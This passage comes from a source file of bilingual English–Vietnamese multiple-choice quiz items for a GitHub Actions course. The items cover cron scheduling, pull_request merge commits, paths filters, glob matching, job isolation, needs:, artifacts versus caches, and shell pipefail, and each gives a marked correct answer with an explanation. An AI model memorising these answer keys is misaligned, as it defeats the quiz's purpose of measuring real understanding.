            'Không lần nào trong mười lần khởi động đúng giờ — tốt nhất là trễ 41 phút và tệ nhất là bốn tiếng rưỡi. Một cron trên GitHub là một LỜI XIN vào hàng đợi, được phục vụ khi có năng lực, và độ trễ không phải thứ bạn điều khiển hay đoán trước được. Nên <code>schedule:</code> trả lời tốt câu "đại khái mỗi tuần" và hoàn toàn không trả lời được câu "lúc 03:00". Hệ quả thực tiễn nằm ở hình dạng cảnh báo: một cái chuông kêu khi "chưa xong trước 04:00" hẳn đã réo tám trên mười Chủ nhật ấy vì một lý do chẳng liên quan gì tới công việc. Một cái chốt tử-nhân dựa trên sự VẮNG MẶT chỉ kêu khi công việc thật sự ngừng xảy ra. Phương án 1 làm mọi thứ tệ hơn — <code>*/5</code> là mức TỐI THIỂU năm phút chứ không phải một lời hứa. Phương án 2 đọc một xu hướng thành một cách chữa; sự cải thiện ấy là phép đo hàng đợi của GitHub và có hạn dùng. Phương án 4 là ca chết-câm: một <code>schedule:</code> trên nhánh không phải mặc định thì không lên lịch cho thứ gì cả, và không có cảnh báo nào.',
          ),
        }),

        // q7 · đáp án 3
        mcq({
          prompt: B(
            'A PR branch is green, <code>main</code> is green, and the merge has no conflict — yet the <code>pull_request</code> run is red. From the rig that reproduced it:' + code(
              'GITHUB_SHA      = ebf646c58c6dfcf24ba494d6d7fca4e16f914698\n' +
              '  ^1 (base)     = 4455dae17852942087937e976f117b6b465f6407\n' +
              '  ^2 (dau PR)   = f1f968b0ebb224829e605d94db8c9d2636937728\n' +
              '  HONG: thu-bao-cao.js - tongDon(10,20) = NaN, mong doi 30\n' +
              'CI DO (1 hong)   exit=1',
            ) + 'What is being tested here?',
            'Nhánh PR xanh, <code>main</code> xanh, bản gộp không xung đột — vậy mà lần chạy <code>pull_request</code> lại đỏ. Trích từ bộ rig đã tái lập nó:' + code(
              'GITHUB_SHA      = ebf646c58c6dfcf24ba494d6d7fca4e16f914698\n' +
              '  ^1 (base)     = 4455dae17852942087937e976f117b6b465f6407\n' +
              '  ^2 (dau PR)   = f1f968b0ebb224829e605d94db8c9d2636937728\n' +
              '  HONG: thu-bao-cao.js - tongDon(10,20) = NaN, mong doi 30\n' +
              'CI DO (1 hong)   exit=1',
            ) + 'Ở đây thứ gì đang được kiểm?',
          ),
          options: [
            B(
              'The base branch as it stands now — GitHub re-runs the base\'s own suite against the PR so that a stale <code>main</code> cannot be merged into',
              'Nhánh gốc ở trạng thái hiện tại — GitHub chạy lại chính bộ test của nhánh gốc đối chiếu với PR để không thể gộp vào một <code>main</code> đã cũ',
            ),
            B(
              'The tip of the PR branch, with the base fetched alongside it so that any test may import files from either side of the comparison',
              'Đầu nhánh PR, có nhánh gốc lấy về nằm cạnh để bài test nào cũng có thể nạp tệp từ bất kỳ phía nào của phép so sánh',
            ),
            B(
              'Both branch tips in sequence, and the run is red because the second pass found a file that the first pass had already rewritten in place',
              'Cả hai đầu nhánh chạy lần lượt, và lần chạy đỏ vì lượt thứ hai tìm thấy một tệp mà lượt thứ nhất đã ghi đè tại chỗ',
            ),
            B(
              'A merge commit that exists on no branch — <code>refs/pull/N/merge</code>, with the base and your tip as its two parents — and that commit is what <code>github.sha</code> holds',
              'Một merge commit không nằm trên nhánh nào — <code>refs/pull/N/merge</code>, với nhánh gốc và đầu nhánh của bạn là hai cha của nó — và commit đó chính là thứ <code>github.sha</code> đang giữ',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The two parents printed above are the giveaway: <code>GITHUB_SHA</code> has <code>^1</code> = the base and <code>^2</code> = your branch tip, which is the signature of a merge commit GitHub computed for this event and published as <code>refs/pull/N/merge</code>. That commit exists on no branch and in nobody\'s local clone, and it is what the job checked out. It is also the right thing to test: no file was edited on both sides, so git reconciled the text perfectly, and what broke was a contract between two files that were never edited together. Only running the merged tree can find that. The practical corollaries are worth carrying: <code>github.ref</code> on a PR is <code>refs/pull/N/merge</code> rather than a branch name, and tagging an image with <code>github.sha</code> on a PR run produces a tag that will correspond to nothing once the PR updates.',
            'Hai cái cha in ở trên chính là dấu vết: <code>GITHUB_SHA</code> có <code>^1</code> là nhánh gốc và <code>^2</code> là đầu nhánh của bạn, và đó là chữ ký của một merge commit mà GitHub tính cho sự kiện này rồi công bố dưới tên <code>refs/pull/N/merge</code>. Commit đó không nằm trên nhánh nào và không có trong bản sao cục bộ của ai cả, và nó là thứ job đã lấy về. Nó cũng là thứ ĐÁNG kiểm: không tệp nào bị sửa ở cả hai phía, nên git hoà giải phần chữ hoàn hảo, và thứ vỡ là một khế ước giữa hai tệp chưa bao giờ được sửa cùng nhau. Chỉ có chạy trên cây đã gộp mới tìm ra nó. Hai hệ quả thực tiễn đáng mang theo: <code>github.ref</code> trên một PR là <code>refs/pull/N/merge</code> chứ không phải tên nhánh, và gắn thẻ ảnh bằng <code>github.sha</code> trong một lần chạy PR sẽ đẻ ra một cái thẻ chẳng ứng với gì một khi PR cập nhật.',
          ),
        }),

        // q8 · đáp án 1
        mcq({
          prompt: B(
            'A team adds a <code>paths:</code> filter to their <code>pull_request</code> trigger so documentation-only PRs stop burning CI minutes. The job is also a required status check. What happens to a README-only PR?',
            'Một nhóm thêm bộ lọc <code>paths:</code> vào trigger <code>pull_request</code> để các PR chỉ sửa tài liệu thôi đốt phút CI. Job đó đồng thời là một required status check. Chuyện gì xảy ra với một PR chỉ sửa README?',
          ),
          options: [
            B(
              'It merges immediately — a filtered-out workflow counts as a pass for branch protection, which is why filtering on <code>pull_request</code> is the recommended way to skip docs PRs',
              'Nó gộp được ngay — một workflow bị lọc ra được branch protection tính là ĐẠT, và đó là lý do lọc ở <code>pull_request</code> là cách khuyến nghị để bỏ qua các PR tài liệu',
            ),
            B(
              'It becomes permanently unmergeable: the check sits at "Expected — Waiting for status to be reported" with no failing job to open and no log to read',
              'Nó vĩnh viễn không gộp được: phép kiểm nằm ở trạng thái "Expected — Waiting for status to be reported", không có job hỏng nào để mở và không có log nào để đọc',
            ),
            B(
              'It goes red — GitHub reports a filtered-out required check as a failure so that the mismatch between the filter and the protection rule is visible on the PR page',
              'Nó đỏ — GitHub báo một required check bị lọc ra là HỎNG để sự lệch pha giữa bộ lọc và luật bảo vệ nhánh hiện ra trên trang PR',
            ),
            B(
              'It runs anyway — <code>paths:</code> is honoured on <code>push</code> only, and GitHub ignores the filter whenever the workflow is listed as a required status check',
              'Nó vẫn chạy — <code>paths:</code> chỉ có hiệu lực với <code>push</code>, và GitHub bỏ qua bộ lọc mỗi khi workflow được liệt kê là một required status check',
            ),
          ],
          correct: 1,
          explanation: EX(
            'GitHub does not treat "this workflow was filtered out" as a pass. It treats it as a result that has not arrived, so the check stays pending forever and branch protection refuses the merge — with nothing to click into. This is precisely why <code>ci-lint.yml</code> in this repository carries <code>paths:</code> on its <code>push</code> trigger and deliberately <em>not</em> on its <code>pull_request</code> trigger; the asymmetry that looks like an oversight is the fix. The standard remedy when you do want path filtering on PRs is to drop <code>paths:</code> from the trigger and move the condition inside: let the job always start, compute the changed-file set in a first step, and put an <code>if:</code> on the expensive steps. A job that starts, finds nothing relevant and exits 0 in eight seconds reports success, which is what branch protection needs.',
            'GitHub KHÔNG coi "workflow này bị lọc ra" là một kết quả ĐẠT. Nó coi đó là một kết quả CHƯA VỀ, nên phép kiểm treo mãi ở trạng thái chờ và branch protection từ chối gộp — mà chẳng có gì để bấm vào. Đây đúng là lý do <code>ci-lint.yml</code> trong kho này mang <code>paths:</code> ở trigger <code>push</code> và CỐ Ý không mang ở trigger <code>pull_request</code>; cái bất đối xứng trông như sơ suất ấy chính là cách chữa. Cách chữa chuẩn khi bạn thật sự muốn lọc theo đường dẫn trên PR là bỏ <code>paths:</code> khỏi trigger rồi đưa điều kiện vào BÊN TRONG: để job luôn khởi động, tính tập tệp đã đổi ở bước đầu, rồi đặt <code>if:</code> lên các bước đắt tiền. Một job khởi động, thấy chẳng có gì liên quan và thoát 0 trong tám giây thì vẫn báo THÀNH CÔNG, đúng thứ branch protection cần.',
          ),
        }),

        // q9 · đáp án 2
        mcq({
          prompt: B(
            'Every tracked file in this repository was matched against these patterns with minimatch 9.0.9 on 10/09/2026 (7,477 files):' + code(
              'mau                so file khop\n' +
              '------------------------------\n' +
              'src/**                      371\n' +
              'src/*                         1     <- src/index.ts\n' +
              '**/*.json                   116\n' +
              '*.json                        4',
            ) + 'What does a <code>paths:</code> filter written as <code>src/*</code> actually do?',
            'Mọi tệp được theo dõi trong kho này đã được đối chiếu với các mẫu sau bằng minimatch 9.0.9 ngày 10/09/2026 (7.477 tệp):' + code(
              'mau                so file khop\n' +
              '------------------------------\n' +
              'src/**                      371\n' +
              'src/*                         1     <- src/index.ts\n' +
              '**/*.json                   116\n' +
              '*.json                        4',
            ) + 'Một bộ lọc <code>paths:</code> viết là <code>src/*</code> thật ra làm gì?',
          ),
          options: [
            B(
              'It matches the whole subtree just as <code>src/**</code> does; the count differs only because minimatch also counts the directory entries that GitHub\'s filter engine skips',
              'Nó khớp cả cây con y như <code>src/**</code>; số đếm khác nhau chỉ vì minimatch còn đếm cả các mục thư mục mà bộ lọc của GitHub bỏ qua',
            ),
            B(
              'It matches nothing at all, because a filter pattern must end in a file extension or a double asterisk to be considered valid by the workflow parser',
              'Nó chẳng khớp gì cả, vì một mẫu lọc phải kết thúc bằng phần mở rộng tệp hoặc hai dấu sao thì bộ đọc workflow mới coi là hợp lệ',
            ),
            B(
              'It removes CI from 370 of the 371 files under <code>src/</code> — a single <code>*</code> does not cross a <code>/</code>, so only files sitting directly in <code>src/</code> match',
              'Nó gỡ CI khỏi 370 trên 371 tệp nằm dưới <code>src/</code> — một dấu <code>*</code> đơn KHÔNG vượt qua dấu <code>/</code>, nên chỉ những tệp nằm thẳng trong <code>src/</code> mới khớp',
            ),
            B(
              'It matches every file under <code>src/</code> but not the directory itself, which is why the pair <code>src/*</code> and <code>src/**</code> is usually written together in a filter',
              'Nó khớp mọi tệp dưới <code>src/</code> nhưng không khớp chính thư mục đó, và vì thế cặp <code>src/*</code> với <code>src/**</code> thường được viết cùng nhau trong một bộ lọc',
            ),
          ],
          correct: 2,
          explanation: EX(
            'A single asterisk matches within one path segment and stops at the separator; <code>**</code> crosses it. Measured on this repository today, that is the difference between 371 files and exactly one — <code>src/index.ts</code>, the only file sitting directly in <code>src/</code>. Write <code>src/*</code> in a <code>paths:</code> filter and you have removed CI from 370 files with no error, no warning, and a workflow that still runs often enough to look alive. The same trap separates <code>*.json</code> (4 files, root only) from <code>**/*.json</code> (116). The habit that prevents it costs nothing: before trusting a filter, replay it over the real file list and count. Note also that these counts have drifted since the course was written — 353 and 93 then, 371 and 116 now — which is exactly why you replay rather than quote.',
            'Một dấu sao đơn khớp trong PHẠM VI một đoạn đường dẫn và dừng ở dấu phân cách; <code>**</code> thì vượt qua nó. Đo trên kho này hôm nay, đó là khác biệt giữa 371 tệp và đúng MỘT — <code>src/index.ts</code>, tệp duy nhất nằm thẳng trong <code>src/</code>. Viết <code>src/*</code> trong một bộ lọc <code>paths:</code> là bạn đã gỡ CI khỏi 370 tệp mà không có lỗi, không có cảnh báo, và một workflow vẫn chạy đủ thường xuyên để trông như còn sống. Cũng cái bẫy ấy tách <code>*.json</code> (4 tệp, chỉ ở gốc) khỏi <code>**/*.json</code> (116). Thói quen ngăn được nó chẳng tốn gì: trước khi tin một bộ lọc, hãy phát lại nó trên danh sách tệp THẬT rồi đếm. Cũng lưu ý các con số này đã trôi kể từ khi giáo trình được soạn — hồi đó là 353 và 93, giờ là 371 và 116 — và đó chính xác là lý do phải phát lại thay vì trích dẫn.',
          ),
        }),

        /* ── Chương 2 — job, runner, needs, bước, ma trận (7 câu) ────────── */

        // q10 · đáp án 0
        mcq({
          prompt: B(
            'One workflow run had five jobs; three of them asked for the label <code>ubuntu-latest</code>. The API reported <code>runner_id</code> 1000003394, 1000003395, 1000003396, 1000003397 and 1000003398. What follows?',
            'Một lần chạy workflow có năm job; ba trong số đó xin nhãn <code>ubuntu-latest</code>. API báo <code>runner_id</code> lần lượt là 1000003394, 1000003395, 1000003396, 1000003397 và 1000003398. Từ đó suy ra gì?',
          ),
          options: [
            B(
              'Every job gets its own machine — asking for the same label means the same KIND of machine, never the same one, and there is no syntax that puts two jobs on one runner',
              'Mỗi job được một cỗ máy riêng — xin cùng một nhãn nghĩa là cùng LOẠI máy, không bao giờ là cùng MỘT máy, và không có cú pháp nào đặt được hai job lên một runner',
            ),
            B(
              'The five ids are lease numbers rather than machines: the three <code>ubuntu-latest</code> jobs shared one host and were issued separate leases for accounting purposes',
              'Năm cái id ấy là số hợp đồng thuê chứ không phải máy: ba job <code>ubuntu-latest</code> dùng chung một máy chủ và được cấp các hợp đồng riêng để tính sổ',
            ),
            B(
              'The runner pool was unusually busy that minute, so jobs that would normally have been packed together were spread out — on a quiet day the same run would report fewer ids',
              'Bể runner phút ấy bận bất thường, nên các job vốn được dồn chung đã bị trải ra — vào một ngày rảnh thì đúng lần chạy đó sẽ báo ít id hơn',
            ),
            B(
              'Three of the five jobs are matrix legs, and a matrix always allocates one runner per leg while ordinary jobs are free to share the host that queued them',
              'Ba trong năm job là nhánh ma trận, và một ma trận luôn cấp một runner cho mỗi nhánh, còn các job thường thì được phép dùng chung máy chủ đã xếp hàng cho chúng',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Five jobs, five machines, measured rather than assumed. Almost everything confusing about Actions follows from this one fact: a job is a virtual machine booted for that job and destroyed when it ends. So the checked-out repository, <code>node_modules</code>, files your steps wrote, exported environment variables, background processes and anything installed with a package manager are all gone at the job boundary. What survives is deliberately narrow — artifacts, caches, declared job outputs, and whatever you pushed to a real external system. Options 2 and 4 both invent a sharing mechanism; there is no arrangement of workflow syntax that gets two jobs onto one runner. Option 3 is refuted by the queue column of the same run: all five jobs waited 2 to 3 seconds, which is what an unloaded pool looks like.',
            'Năm job, năm cỗ máy, đo được chứ không phải phỏng đoán. Gần như mọi thứ gây rối trong Actions đều chảy ra từ đúng sự thật này: một job là một máy ảo được khởi động cho riêng job đó và bị huỷ khi nó kết thúc. Nên bản mã đã lấy về, <code>node_modules</code>, các tệp mà bước của bạn ghi ra, biến môi trường đã export, tiến trình chạy nền và mọi thứ cài bằng trình quản lý gói — tất cả đều biến mất ở ranh giới job. Thứ sống sót được khoanh hẹp một cách có chủ đích: artifact, cache, output của job đã khai báo, và thứ bạn đã đẩy sang một hệ thống bên ngoài thật sự. Phương án 2 và 4 đều bịa ra một cơ chế dùng chung; không có cách sắp đặt cú pháp nào đưa được hai job lên một runner. Phương án 3 bị chính cột xếp hàng của lần chạy ấy bác bỏ: cả năm job chờ 2–3 giây, đúng dáng vẻ của một bể máy đang rảnh.',
          ),
        }),

        // q11 · đáp án 1
        mcq({
          prompt: B(
            'Step 4 of a job runs <code>export VERSION=1.2.3</code>. Step 5, in the same job, runs <code>echo "$VERSION"</code>. What does step 5 print, and what is the supported mechanism?',
            'Bước 4 của một job chạy <code>export VERSION=1.2.3</code>. Bước 5, trong CÙNG job, chạy <code>echo "$VERSION"</code>. Bước 5 in ra gì, và cơ chế được hỗ trợ là gì?',
          ),
          options: [
            B(
              'It prints <code>1.2.3</code>, because the two steps share one filesystem and therefore one shell session; the value would only be lost across a job boundary',
              'Nó in ra <code>1.2.3</code>, vì hai bước dùng chung một hệ tệp nên cũng chung một phiên shell; giá trị chỉ mất khi vượt qua ranh giới job',
            ),
            B(
              'It prints nothing — each step is its own shell process, and the supported channel is <code>echo "VERSION=1.2.3" &gt;&gt; $GITHUB_ENV</code>, which the writing step still cannot read',
              'Nó in ra chuỗi rỗng — mỗi bước là một tiến trình shell riêng, và kênh được hỗ trợ là <code>echo "VERSION=1.2.3" &gt;&gt; $GITHUB_ENV</code>, mà chính bước ghi ra nó vẫn không đọc lại được',
            ),
            B(
              'It prints <code>1.2.3</code> only when both steps declare the same <code>shell:</code> value, since the runner reuses one interpreter per shell dialect within a job',
              'Nó in ra <code>1.2.3</code> chỉ khi cả hai bước khai cùng một giá trị <code>shell:</code>, vì runner dùng lại một trình thông dịch cho mỗi phương ngữ shell trong một job',
            ),
            B(
              'The step fails — referring to a variable that the runner did not declare in an <code>env:</code> block is an error under the default shell, which runs with <code>set -u</code>',
              'Bước ấy hỏng — tham chiếu một biến mà runner không khai trong khối <code>env:</code> là một lỗi dưới shell mặc định, vốn chạy với <code>set -u</code>',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Each <code>run:</code> block is written to a script file and executed as a separate process, so an <code>export</code> in one is simply gone by the next — along with shell functions, <code>cd</code>, and <code>set -x</code>. The working directory resets to the job\'s <code>working-directory</code> each time. The two supported channels both work by writing to a file whose path the runner puts in an environment variable: <code>&gt;&gt; $GITHUB_ENV</code> for an environment variable visible to every <em>later</em> step, and <code>&gt;&gt; $GITHUB_OUTPUT</code> with an <code>id:</code> on the step for a value read as <code>steps.&lt;id&gt;.outputs.&lt;name&gt;</code>. Neither reaches another job, and neither is visible in the step that wrote it. Option 1 confuses a shared disk with a shared process. Option 3 invents interpreter reuse. Option 4 is wrong on the default: the shell is <code>bash -e</code>, not <code>bash -eu</code>.',
            'Mỗi khối <code>run:</code> được ghi ra một tệp script rồi chạy như một tiến trình riêng, nên một lệnh <code>export</code> ở khối này đơn giản là biến mất ở khối sau — cùng với các hàm shell, lệnh <code>cd</code> và <code>set -x</code>. Thư mục làm việc cũng đặt lại về <code>working-directory</code> của job ở mỗi bước. Hai kênh được hỗ trợ đều hoạt động bằng cách ghi vào một tệp mà runner đặt đường dẫn của nó vào một biến môi trường: <code>&gt;&gt; $GITHUB_ENV</code> cho một biến môi trường mà mọi bước SAU đó nhìn thấy, và <code>&gt;&gt; $GITHUB_OUTPUT</code> kèm một <code>id:</code> trên bước, đọc bằng <code>steps.&lt;id&gt;.outputs.&lt;name&gt;</code>. Không cái nào với sang job khác được, và không cái nào hiện ra ngay trong chính bước đã ghi. Phương án 1 lẫn đĩa dùng chung với tiến trình dùng chung. Phương án 3 bịa ra chuyện dùng lại trình thông dịch. Phương án 4 sai về mặc định: shell là <code>bash -e</code>, không phải <code>bash -eu</code>.',
          ),
        }),

        // q12 · đáp án 3
        mcq({
          prompt: B(
            'Three build jobs started together at 19:50:48; a publish job declared <code>needs: dung</code> on the matrix that produced them.' + code(
              'Linux xong   19:54:49 -> NGOI CHO 197s = 3m17s\n' +
              'Windows xong 19:56:11 -> NGOI CHO 115s = 1m55s\n' +
              'macOS xong   19:58:05 -> KE DINH NHIP, cho 1s\n' +
              'tong may DUNG XONG ma khong dung duoc: 312s = 5m12s',
            ) + 'What does that measurement say about <code>needs:</code>?',
            'Ba job dựng cùng khởi động lúc 19:50:48; một job công bố khai <code>needs: dung</code> lên đúng cái ma trận đã đẻ ra chúng.' + code(
              'Linux xong   19:54:49 -> NGOI CHO 197s = 3m17s\n' +
              'Windows xong 19:56:11 -> NGOI CHO 115s = 1m55s\n' +
              'macOS xong   19:58:05 -> KE DINH NHIP, cho 1s\n' +
              'tong may DUNG XONG ma khong dung duoc: 312s = 5m12s',
            ) + 'Phép đo ấy nói gì về <code>needs:</code>?',
          ),
          options: [
            B(
              'It starts the dependent job as soon as the first leg finishes, and the 5m12s figure is the time the publish job spent re-checking legs that had not reported yet',
              'Nó khởi động job phụ thuộc ngay khi nhánh đầu tiên xong, và con số 5m12s là thời gian job công bố dành để kiểm lại những nhánh chưa báo cáo',
            ),
            B(
              'It cancels a leg once its output has been uploaded, which is why Linux stopped at 19:54:49 and released its runner three minutes before the run ended',
              'Nó HUỶ một nhánh khi sản phẩm của nhánh ấy đã tải lên xong, và đó là lý do Linux dừng lúc 19:54:49 và nhả runner ba phút trước khi lần chạy kết thúc',
            ),
            B(
              'It waits for the matrix as a whole only when <code>fail-fast</code> is off; with the default setting each leg would have released the publish job independently',
              'Nó chỉ đợi cả ma trận khi <code>fail-fast</code> đang tắt; với thiết lập mặc định thì mỗi nhánh sẽ giải phóng job công bố một cách độc lập',
            ),
            B(
              'It waits for EVERY leg of the matrix, so the slowest one sets the pace and two finished, correct builds sat unusable on disk for a combined 5m12s',
              'Nó đợi MỌI nhánh của ma trận, nên nhánh chậm nhất định nhịp và hai bản dựng đã xong, đã đúng, nằm chết trên đĩa tổng cộng 5m12s',
            ),
          ],
          correct: 3,
          explanation: EX(
            '<code>needs:</code> is the only ordering primitive there is, and it waits for every job named — including every leg a matrix expanded into. So the stage takes as long as its slowest member, and everything that finished earlier waits. That is not a bug: the publish job genuinely needs all three installers. It is the shape of the cost, and it is the number you attack when you want the run to be faster. The critical path here is 72 + 437 + 34 = 543 seconds against 1,107 machine-seconds of total compute, which is why halving the Linux build would return exactly zero wall-clock. Option 1 and option 3 both describe a per-leg release that does not exist. Option 2 inverts cause and effect — Linux stopped because it was finished, and its runner being released is what makes the waiting free in machine-seconds and expensive in wall-clock.',
            '<code>needs:</code> là công cụ sắp thứ tự DUY NHẤT, và nó đợi mọi job được nêu tên — kể cả từng nhánh mà một ma trận nở ra. Nên một chặng kéo dài đúng bằng thành viên chậm nhất của nó, và mọi thứ xong sớm đều phải chờ. Đó không phải lỗi: job công bố thật sự cần cả ba bản cài. Đó là HÌNH DẠNG của cái giá, và đó là con số bạn tấn công khi muốn lần chạy nhanh hơn. Đường tới hạn ở đây là 72 + 437 + 34 = 543 giây so với 1.107 máy-giây tính toán tổng cộng, và vì thế giảm một nửa job Linux sẽ trả về đúng KHÔNG giây đồng hồ. Phương án 1 và 3 đều mô tả một phép giải phóng theo từng nhánh không hề tồn tại. Phương án 2 đảo ngược nhân quả — Linux dừng vì nó đã XONG, và việc runner của nó được nhả ra chính là thứ khiến cú chờ ấy miễn phí về máy-giây và đắt đỏ về thời gian đồng hồ.',
          ),
        }),

        // q13 · đáp án 0
        mcq({
          prompt: B(
            'A build job produces <code>dist/app.zip</code>. A later job, declared with <code>needs:</code>, must read that file. Which mechanism is correct, and why are the others wrong?',
            'Một job dựng sinh ra <code>dist/app.zip</code>. Một job sau đó, khai bằng <code>needs:</code>, phải đọc được tệp ấy. Cơ chế nào ĐÚNG, và vì sao các cơ chế kia sai?',
          ),
          options: [
            B(
              'An artifact: upload it explicitly and download it explicitly. A cache is best-effort and may be evicted, a job output is a small declared string, and the filesystem does not survive the job',
              'Một artifact: tải lên tường minh rồi tải về tường minh. Cache là nỗ-lực-tốt-nhất và có thể bị thu hồi, job output là một chuỗi nhỏ đã khai báo, còn hệ tệp thì không sống sót qua job',
            ),
            B(
              'A cache keyed on the commit SHA, because a cache entry written in one job of a run is guaranteed to be readable by every later job of that same run',
              'Một cache đặt khoá theo SHA của commit, vì một mục cache ghi ở một job trong một lần chạy thì chắc chắn mọi job sau của chính lần chạy ấy đọc được',
            ),
            B(
              'A job output — <code>outputs:</code> on the producing job, read as <code>needs.dung.outputs.file</code> — which is the channel designed for passing build results between jobs',
              'Một job output — khai <code>outputs:</code> trên job sinh ra nó, đọc bằng <code>needs.dung.outputs.file</code> — đó là kênh được thiết kế để chuyển kết quả dựng giữa các job',
            ),
            B(
              'Nothing is needed: a <code>needs:</code> edge hands the workspace of the upstream job to the downstream one, which is the whole reason the edge exists',
              'Không cần gì cả: một cạnh <code>needs:</code> trao thư mục làm việc của job phía trên cho job phía dưới, và đó là toàn bộ lý do cạnh ấy tồn tại',
            ),
          ],
          correct: 0,
          explanation: EX(
            'A job boundary is a machine boundary, so anything that crosses it has to be carried. An artifact is the supported carrier: guaranteed present for its retention period, listed on the run page, downloadable by a human. The useful test is what a miss means — if a miss would <em>break</em> the workflow it is an artifact, and if a miss would merely cost time it is a cache. Option 2 fails that test: a cache can be evicted at any moment, so relying on a hit for correctness is a workflow that works until the day it does not. Option 3 confuses channels — <code>outputs:</code> carries small declared strings such as a version number or a computed tag, and is capped; it is not a file transfer. Option 4 describes a shared workspace that <code>needs:</code> does not provide; the upstream machine no longer exists.',
            'Ranh giới job là ranh giới MÁY, nên bất cứ thứ gì vượt qua nó đều phải được KHIÊNG. Artifact là người khiêng được hỗ trợ: bảo đảm còn đó trong suốt thời hạn lưu, hiện trên trang lần chạy, con người tải về được. Phép thử hữu dụng là hỏi một cú TRƯỢT nghĩa là gì — nếu trượt làm workflow HỎNG thì đó là artifact, còn nếu trượt chỉ tốn thêm thời gian thì đó là cache. Phương án 2 trượt phép thử ấy: một mục cache có thể bị thu hồi bất cứ lúc nào, nên dựa vào một cú trúng để bảo đảm tính đúng đắn là một workflow chạy được cho tới ngày nó không chạy. Phương án 3 lẫn hai kênh — <code>outputs:</code> chở những chuỗi nhỏ đã khai báo như một số phiên bản hay một cái thẻ vừa tính ra, và nó có trần; nó không phải kênh chuyển tệp. Phương án 4 mô tả một thư mục làm việc dùng chung mà <code>needs:</code> không hề cung cấp; cỗ máy phía trên đã không còn tồn tại.',
          ),
        }),

        // q14 · đáp án 2
        mcq({
          prompt: B(
            'One commit, one workflow file, three runners executing the same steps:' + code(
              'buoc                 Linux   macOS  Windows    mac/lin win/lin\n' +
              '--------------------------------------------------------------\n' +
              'checkout                7s      6s      11s       0.9x    1.6x\n' +
              'npm ci #1              12s     22s      39s       1.8x    3.2x\n' +
              'Dung                  149s    315s     171s       2.1x    1.1x\n' +
              'tai artifact len        8s     27s       6s       3.4x    0.8x',
            ) + 'What is the right reading of these ratio columns?',
            'Một commit, một tệp workflow, ba runner chạy đúng những bước như nhau:' + code(
              'buoc                 Linux   macOS  Windows    mac/lin win/lin\n' +
              '--------------------------------------------------------------\n' +
              'checkout                7s      6s      11s       0.9x    1.6x\n' +
              'npm ci #1              12s     22s      39s       1.8x    3.2x\n' +
              'Dung                  149s    315s     171s       2.1x    1.1x\n' +
              'tai artifact len        8s     27s       6s       3.4x    0.8x',
            ) + 'Cách đọc ĐÚNG các cột tỉ lệ này là gì?',
          ),
          options: [
            B(
              'macOS is about twice as slow and Windows about one and a half times, so a single multiplier per platform predicts any step well enough to plan a matrix around',
              'macOS chậm khoảng gấp đôi còn Windows khoảng gấp rưỡi, nên một hệ số duy nhất cho mỗi nền tảng đủ để dự đoán mọi bước và lập kế hoạch ma trận quanh nó',
            ),
            B(
              'The rows are not comparable because each platform cached different steps, so the per-step figures should be discarded in favour of the job totals',
              'Các dòng không so sánh được vì mỗi nền tảng cache những bước khác nhau, nên nên bỏ số liệu từng bước mà dùng số tổng của job',
            ),
            B(
              'A platform has a PROFILE, not a speed: Windows loses on work counted in file creations, macOS on sustained CPU and upload — and macOS beats Linux at checkout',
              'Một nền tảng có một HỒ SƠ chứ không có một tốc độ: Windows thua ở việc đếm bằng số lần tạo tệp, macOS thua ở CPU chạy dài và ở tải lên — và macOS còn NHANH HƠN Linux ở checkout',
            ),
            B(
              'Windows is the platform to avoid: it is slowest on three of the four rows, and the artifact upload row confirms that its network path is the weakest of the three',
              'Windows là nền tảng cần tránh: nó chậm nhất ở ba trên bốn dòng, và dòng tải artifact lên xác nhận đường mạng của nó là yếu nhất trong ba',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Read down the ratio columns rather than across the totals. Windows is 3.2× slower at <code>npm ci</code>, which writes tens of thousands of tiny files, and only 1.1× slower at the build, which is CPU. macOS is the reverse — 2.1× on the build and 3.4× on the upload — and it is <em>faster</em> than Linux at checkout, which is enough on its own to refute "macOS runners are slow" as a general statement. That is why option 1 fails: the job totals of 2.0× and 1.5× are averages of things that have nothing to do with each other, and quoting either predicts the wrong number for any specific step. Option 2 invents a caching difference; the same commit ran the same steps in the same order. Option 4 misreads the table — Windows is fastest of the three on the upload row (6s), and the practical conclusion is to hoist platform-independent work off the matrix rather than to ban a platform.',
            'Hãy đọc DỌC các cột tỉ lệ chứ đừng đọc NGANG các số tổng. Windows chậm hơn 3,2 lần ở <code>npm ci</code>, thứ ghi ra hàng chục nghìn tệp bé xíu, và chỉ chậm hơn 1,1 lần ở bước dựng vốn là việc của CPU. macOS thì ngược lại — 2,1 lần ở bước dựng và 3,4 lần ở lượt tải lên — và nó còn NHANH HƠN Linux ở checkout, riêng điều đó đã đủ bác bỏ câu "runner macOS chậm" như một phát biểu tổng quát. Vì thế phương án 1 hỏng: các số tổng 2,0 lần và 1,5 lần là trung bình của những thứ chẳng liên quan gì tới nhau, và trích cái nào cũng dự đoán sai cho một bước cụ thể. Phương án 2 bịa ra một khác biệt về cache; cùng một commit đã chạy đúng những bước ấy theo đúng thứ tự ấy. Phương án 4 đọc nhầm bảng — Windows là nhanh nhất trong ba ở dòng tải lên (6s), và kết luận thực tiễn là NHẤC những việc không phụ thuộc nền tảng ra khỏi ma trận, chứ không phải cấm một nền tảng.',
          ),
        }),

        // q15 · đáp án 1
        mcq({
          prompt: B(
            'The same two-line script was run under the two shells GitHub uses. Measured on GNU bash 3.2.57:' + code(
              '$ cat pipe.sh\n' +
              'lenh-khong-ton-tai | tail -1\n' +
              '\n' +
              '$ bash -e pipe.sh                                  (MAC DINH)\n' +
              'pipe.sh: line 1: lenh-khong-ton-tai: command not found\n' +
              '>>> exit=0\n' +
              '\n' +
              '$ bash --noprofile --norc -eo pipefail pipe.sh     (shell: bash)\n' +
              'pipe.sh: line 1: lenh-khong-ton-tai: command not found\n' +
              '>>> exit=127',
            ) + 'What does writing <code>shell: bash</code> on a step buy?',
            'Cùng một script hai dòng được chạy dưới hai cái shell mà GitHub dùng. Đo trên GNU bash 3.2.57:' + code(
              '$ cat pipe.sh\n' +
              'lenh-khong-ton-tai | tail -1\n' +
              '\n' +
              '$ bash -e pipe.sh                                  (MAC DINH)\n' +
              'pipe.sh: line 1: lenh-khong-ton-tai: command not found\n' +
              '>>> exit=0\n' +
              '\n' +
              '$ bash --noprofile --norc -eo pipefail pipe.sh     (shell: bash)\n' +
              'pipe.sh: line 1: lenh-khong-ton-tai: command not found\n' +
              '>>> exit=127',
